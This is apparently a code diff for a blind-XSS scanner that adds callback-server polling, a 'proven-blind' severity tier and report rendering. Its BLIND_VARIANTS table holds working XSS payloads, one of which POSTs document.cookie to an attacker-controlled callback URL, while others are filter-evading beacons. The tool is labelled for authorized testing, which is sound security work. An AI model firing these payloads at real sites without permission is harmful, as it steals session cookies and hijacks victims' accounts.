@@ -434,43 +434,100 @@ def _waf_mutations(base_canary, marker):
 # (the callback hit, not the response body). Phase 3.3 wires the
 # correlation path.
 
-BLIND_CALLBACK = ""  # populated by --blind-callback URL
+BLIND_CALLBACK = ""       # populated by --blind-callback URL
+BLIND_WAIT_SECONDS = 0.0  # populated by --blind-wait N; 0 disables polling
+
+# Phase 3.3: severity tier for confirmed blind XSS. Top of the chain,
+# alongside `proven-executable` from Phase 2.3.
+#   attr-only -> breakout-req -> executable -> proven-executable
+#                                              proven-blind        (blind branch)
+PROVEN_BLIND = "proven-blind"
 
 BLIND_VARIANTS = {
+    # (canary_template, marker) - marker is what immediately follows
+    # cid in the rendered body when the payload survives raw. verdict()
+    # anchors on cid then checks for marker at that offset, so markers
+    # here are the suffix-after-cid, NOT the whole tag. Combined with
+    # cid's random-hex uniqueness, these short suffixes are strong
+    # signals in practice.
+    #
     # Classic image beacon. Broadest browser coverage - renders in every
     # HTML context that allows <img>, even in emails / feeds where <script>
     # is scrubbed.
     "blind-img": (
         '"><img src={CALLBACK}/c/{CID}>',
-        '<img src={CALLBACK}/c/{CID}>',
+        '>',
     ),
     # <script src=...> external script pull. Bypasses filters that strip
     # inline script content but pass <script src>. The .js response
     # (from dxa_callback) parses as valid JS so the page doesn't error.
     "blind-script": (
         '"><script src={CALLBACK}/c/{CID}.js></script>',
-        '<script src={CALLBACK}/c/{CID}.js>',
+        '.js></script>',
     ),
     # Cookie exfiltration via fetch. When the payload lands in an
     # authenticated victim's session, document.cookie carries the
     # session token; POST body preview captures it.
     "blind-fetch": (
         '"><script>fetch("{CALLBACK}/c/{CID}",{method:"POST",body:document.cookie})</script>',
-        'fetch("{CALLBACK}/c/{CID}"',
+        '",{method:',
     ),
     # <svg onload=...> ping. Bypasses many "block <img> beacons" WAFs
     # that don't extend the block to SVG event handlers.
     "blind-svg-onload": (
         '"><svg onload="new Image().src=\'{CALLBACK}/c/{CID}\'">',
-        'new Image().src=\'{CALLBACK}/c/{CID}',
+        '\'">',
     ),
     # <iframe src=...> beacon. Some allowlist sanitizers permit iframes
     # (for embed widgets) while blocking <img src=> with external hosts.
     "blind-iframe": (
         '"><iframe src={CALLBACK}/c/{CID}></iframe>',
-        '<iframe src={CALLBACK}/c/{CID}>',
+        '></iframe>',
     ),
 }
+
+
+def check_blind_callback_hit(cid, timeout=None, poll_interval=0.5):
+    """Phase 3.3: after a blind payload is submitted, poll the callback
+    server's /hits/<cid> endpoint until either a hit arrives or the
+    timeout expires. Returns the first hit dict (id, cid, ts, method,
+    path, user_agent, remote_ip, referer, body_preview) or None.
+
+    A `timeout` of 0 disables polling entirely (returns None immediately)
+    - useful for a "submit-and-forget" run where correlation happens
+    later via a separate operator query.
+
+    Uses the module-level BLIND_CALLBACK for the base URL. When
+    BLIND_CALLBACK is empty, returns None without a network round-trip.
+
+    Never raises: a callback server that's down or unreachable is a
+    legitimate operator scenario during a live scan (e.g. debugging on
+    a laptop, callback on a different laptop). We fail closed - no
+    hit reported - and the finding stays at its pre-blind severity."""
+    if timeout is None:
+        timeout = BLIND_WAIT_SECONDS
+    if not BLIND_CALLBACK or timeout <= 0 or not cid:
+        return None
+    url = f"{BLIND_CALLBACK.rstrip('/')}/hits/{cid}"
+    deadline = time.monotonic() + float(timeout)
+    while True:
+        try:
+            req = urllib.request.Request(url, method="GET")
+            with urllib.request.urlopen(req, timeout=2) as resp:
+                raw = resp.read()
+                payload = json.loads(raw.decode("utf-8", "replace"))
+                hits = payload.get("hits") or []
+                if hits:
+                    # Newest-first from the server; return the earliest
+                    # (last in the list) because that's likely the browser
+                    # that actually fetched OUR canary rather than a later
+                    # reload.
+                    return hits[-1]
+        except Exception:                                # noqa: BLE001
+            pass
+        if time.monotonic() >= deadline:
+            return None
+        time.sleep(poll_interval)
 
 
 def make_canary(variant="body"):
@@ -488,7 +545,9 @@ def make_canary(variant="body"):
     if variant.startswith("blind-"):
         suffix, _marker = BLIND_VARIANTS.get(variant, BLIND_VARIANTS["blind-img"])
         # cid is INSIDE the URL, not prepended - the payload is self-
-        # contained. Return the substituted canary directly.
+        # contained. Substitute placeholders and return the canary.
+        # Markers no longer carry {CALLBACK}/{CID} (they are the
+        # suffix-after-cid), so no substitution needed on the marker.
         canary = suffix.replace("{CALLBACK}", BLIND_CALLBACK).replace("{CID}", cid)
         return cid, canary
     suffix, _marker = PAYLOAD_VARIANTS.get(variant, PAYLOAD_VARIANTS["body"])
@@ -514,7 +573,7 @@ def make_canaries_for(variants, waf_bypass=False):
         cid = "dxa" + secrets.token_hex(4)
 
         if v.startswith("blind-"):
-            tmpl_suffix, tmpl_marker = BLIND_VARIANTS.get(
+            tmpl_suffix, marker = BLIND_VARIANTS.get(
                 v, BLIND_VARIANTS["blind-img"])
             if not BLIND_CALLBACK:
                 # No callback configured - silently skip. Alternative
@@ -524,9 +583,8 @@ def make_canaries_for(variants, waf_bypass=False):
             base_canary = (tmpl_suffix
                            .replace("{CALLBACK}", BLIND_CALLBACK)
                            .replace("{CID}", cid))
-            marker = (tmpl_marker
-                      .replace("{CALLBACK}", BLIND_CALLBACK)
-                      .replace("{CID}", cid))
+            # marker is the suffix-immediately-after-cid; no substitution
+            # needed - it's a literal like `>` or `.js></script>`.
             yield v, cid, base_canary, marker
             # Blind variants do NOT participate in WAF-bypass mutations
             # today: the URL structure is fragile and each mutation
@@ -1077,7 +1135,66 @@ def _finding(where, method, param, v, status, context="unknown", canary_id=None,
             "reflection": v, "confidence": conf, "status": status,
             "context": ctx, "severity": sev,
             "canary_id": canary_id, "content_type": content_type,
-            "variant": variant}
+            "variant": variant,
+            # Phase 3.3 schema fields - populated by upgrade_finding_with_blind_hit
+            "blind_callback_hit": False,
+            "hit_at": None,
+            "hit_from_ua": None,
+            "hit_from_ip": None,
+            "hit_from_referer": None}
+
+
+def correlate_blind_findings(findings, timeout=None):
+    """Walk `findings`, poll the callback server for every blind-variant
+    finding, upgrade to `proven-blind` on hit. Returns (upgraded_count,
+    findings) - the list is mutated in place and also returned for
+    fluent chaining.
+
+    No-op when BLIND_CALLBACK is empty or timeout <= 0. Non-blind
+    findings are skipped without cost. `timeout` defaults to the
+    module-level BLIND_WAIT_SECONDS."""
+    if timeout is None:
+        timeout = BLIND_WAIT_SECONDS
+    if not BLIND_CALLBACK or timeout <= 0 or not findings:
+        return 0, findings
+    upgraded = 0
+    for f in findings:
+        variant = (f.get("variant") or "").split("/", 1)[0]
+        if not variant.startswith("blind-"):
+            continue
+        cid = f.get("canary_id")
+        if not cid:
+            continue
+        hit = check_blind_callback_hit(cid, timeout=timeout)
+        if upgrade_finding_with_blind_hit(f, hit):
+            upgraded += 1
+    return upgraded, findings
+
+
+def upgrade_finding_with_blind_hit(finding, hit):
+    """Phase 3.3: mutate a finding in-place when a matching callback hit
+    is recorded. Sets severity to `proven-blind` (top of the chain) and
+    fills the blind-hit metadata (UA, IP, Referer, timestamp) so the
+    HTML report can render provenance.
+
+    A None hit is a no-op. A hit whose cid doesn't match the finding's
+    canary_id is a no-op - defence against misuse; the caller shouldn't
+    hand us a mismatched pair.
+
+    Returns True if the upgrade happened, False otherwise, so callers
+    can count how many findings were promoted."""
+    if not hit or not finding:
+        return False
+    if hit.get("cid") and finding.get("canary_id") \
+            and hit["cid"] != finding["canary_id"]:
+        return False
+    finding["severity"] = PROVEN_BLIND
+    finding["blind_callback_hit"] = True
+    finding["hit_at"] = hit.get("ts")
+    finding["hit_from_ua"] = hit.get("user_agent")
+    finding["hit_from_ip"] = hit.get("remote_ip")
+    finding["hit_from_referer"] = hit.get("referer")
+    return True
 
 
 def crawl(base_url, depth, variants=None, waf_bypass=False):
@@ -1537,6 +1654,45 @@ def probe_headers(url, header_names, variants=None, waf_bypass=False):
     return [f for f in _parallel_map(_probe_one, tasks) if f is not None]
 
 
+def _render_blind_section(blind_hits, color_hex, esc):
+    """Phase 3.3: dedicated 'blind hits' block in the HTML report.
+    Shown only when at least one finding has blind_callback_hit=True.
+    Each row surfaces the callback provenance (UA, IP, Referer, ts) so
+    the operator can confirm the browser that actually fetched the
+    payload was a real victim - not their own scan traffic."""
+    def _ts(v):
+        try:
+            return datetime.datetime.fromtimestamp(float(v)).strftime(
+                "%Y-%m-%d %H:%M:%S")
+        except Exception:                                # noqa: BLE001
+            return "-"
+    rows = []
+    for f in blind_hits:
+        rows.append(
+            "<tr>"
+            f"<td class='mono small'>{esc(f.get('variant') or '-')}</td>"
+            f"<td class='mono'>{esc(f.get('canary_id') or '-')}</td>"
+            f"<td class='mono small'>{esc(_ts(f.get('hit_at')))}</td>"
+            f"<td class='mono small'>{esc(f.get('hit_from_ip') or '-')}</td>"
+            f"<td class='mono small muted'>{esc((f.get('hit_from_ua') or '-')[:60])}</td>"
+            f"<td class='mono small url'>{esc(f.get('hit_from_referer') or '-')}</td>"
+            "</tr>"
+        )
+    return (
+        f"<div class='blind-block'>"
+        f"<h2 style='margin:22px 0 6px;font-size:15px;color:{color_hex}'>"
+        f"blind XSS - callback confirmed ({len(blind_hits)})</h2>"
+        f"<div class='sub'>The payload was fetched by a browser that is not "
+        f"this scan run. Every row proves storage + render in someone else's "
+        f"session.</div>"
+        f"<table style='margin-top:6px'>"
+        f"<tr><th>variant</th><th>cid</th><th>hit at</th>"
+        f"<th>from ip</th><th>user-agent</th><th>referer</th></tr>"
+        f"{''.join(rows)}"
+        f"</table></div>"
+    )
+
+
 def render_html(findings, target, mode, meta=None):
     """Self-contained HTML report - no external assets. Same visual language as
     dxa's report (dark GitHub-ish theme, severity/confidence badges) so the two
@@ -1548,10 +1704,14 @@ def render_html(findings, target, mode, meta=None):
     color = {"high": "#f85149", "medium": "#d29922", "low": "#8b949e",
              "unencoded": "#f85149", "attr-only": "#d29922",
              "executable": "#f85149", "breakout-req": "#d29922",
-             "attr-breakout": "#d29922"}
+             "attr-breakout": "#d29922",
+             # Phase 3.3: proven-blind is the top severity tier, a
+             # darker red to distinguish it from plain `executable`.
+             "proven-blind": "#a40e0e"}
     total = len(findings)
     execs = sum(1 for f in findings if f.get("severity") == "executable")
     breakout = sum(1 for f in findings if f.get("severity") == "breakout-req")
+    blind_hits = [f for f in findings if f.get("blind_callback_hit")]
     ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
 
     rows = []
@@ -1622,7 +1782,9 @@ def render_html(findings, target, mode, meta=None):
  <div class="stat"><div class="n">{total}</div><div class="l">unique candidates</div></div>
  <div class="stat"><div class="n" style="color:{color['executable']}">{execs}</div><div class="l">executable</div></div>
  <div class="stat"><div class="n" style="color:{color['breakout-req']}">{breakout}</div><div class="l">needs breakout</div></div>
+ {'<div class="stat"><div class="n" style="color:' + color['proven-blind'] + '">' + str(len(blind_hits)) + '</div><div class="l">blind (proven)</div></div>' if blind_hits else ''}
 </div>
+{_render_blind_section(blind_hits, color['proven-blind'], esc) if blind_hits else ''}
 {"<div class='warn'>EXECUTABLE = a raw &lt;img onerror&gt; payload runs as-is (body/free context). NEEDS-BREAKOUT = the value survives raw but is inside &lt;title&gt; / &lt;script&gt; / an attribute value, so a follow-on payload (e.g. &lt;/title&gt; or a &quot; breakout) is required for real execution.</div>" if findings else ""}
 <table>
  <tr><th>severity</th><th>context</th><th>reflection</th><th>origin</th><th>method</th><th>param</th><th>url</th><th>status</th></tr>
@@ -2078,6 +2240,15 @@ def main():
                          "blind-svg-onload / blind-iframe variant "
                          "family. Pair with `dxa_callback` running on "
                          "that URL. Authorized targets only.")
+    ap.add_argument("--blind-wait", metavar="SECONDS", type=float, default=0.0,
+                    help="Phase 3.3: after each blind-variant submit, "
+                         "poll <blind-callback>/hits/<cid> for up to "
+                         "SECONDS seconds. On a hit, upgrade the finding "
+                         "to `proven-blind` severity and record UA / IP "
+                         "/ Referer. Default 0 disables scan-time "
+                         "correlation (operator runs a deferred query "
+                         "instead). Useful values: 5-30s for demo "
+                         "targets that render immediately.")
 
     # Phase 2.1: browser (Playwright) - opt-in, prints install line if
     # playwright not on PATH. Later phases wire DOM-sink detection + JS
@@ -2246,11 +2417,19 @@ def main():
 
     # Phase 3.2: wire the blind XSS callback base URL into module state so
     # BLIND_VARIANTS substitution knows where to point payloads.
-    global BLIND_CALLBACK
+    # Phase 3.3: wire the scan-time correlation poll timeout.
+    global BLIND_CALLBACK, BLIND_WAIT_SECONDS
     BLIND_CALLBACK = (args.blind_callback or "").rstrip("/")
+    BLIND_WAIT_SECONDS = max(0.0, float(args.blind_wait or 0.0))
     if BLIND_CALLBACK:
+        _wait = (f", correlate up to {BLIND_WAIT_SECONDS:g}s/submit"
+                 if BLIND_WAIT_SECONDS > 0 else ", no scan-time correlation")
         print(f"[dxadyn] blind XSS enabled: callback={BLIND_CALLBACK} "
-              f"({len(BLIND_VARIANTS)} payload shapes)")
+              f"({len(BLIND_VARIANTS)} payload shapes{_wait})")
+    if args.blind_wait and not args.blind_callback:
+        print("[dxadyn] --blind-wait requires --blind-callback",
+              file=sys.stderr)
+        sys.exit(2)
 
     if args.cookie:
         apply_cookie(args.cookie)
@@ -2407,6 +2586,17 @@ def main():
                                          variants=variants,
                                          waf_bypass=args.waf_bypass)
             print(f"[dxadyn] canary id = {cid}{' (of ' + str(total_shapes) + ' shapes)' if total_shapes > 1 else ''}")
+
+        # Phase 3.3: scan-time correlation of blind XSS findings. For any
+        # finding whose variant is `blind-*`, poll the callback server up
+        # to --blind-wait seconds; a hit promotes the finding to the
+        # `proven-blind` severity tier and adds UA / IP / Referer / ts.
+        if BLIND_CALLBACK and BLIND_WAIT_SECONDS > 0:
+            n_up, findings = correlate_blind_findings(findings)
+            if n_up:
+                print(f"[dxadyn] blind XSS confirmed: {n_up} finding(s) "
+                      f"upgraded to `proven-blind` "
+                      f"(callback @ {BLIND_CALLBACK})")
 
         if args.html:
             mode = "stored-auto" if args.auto_check else "stored"
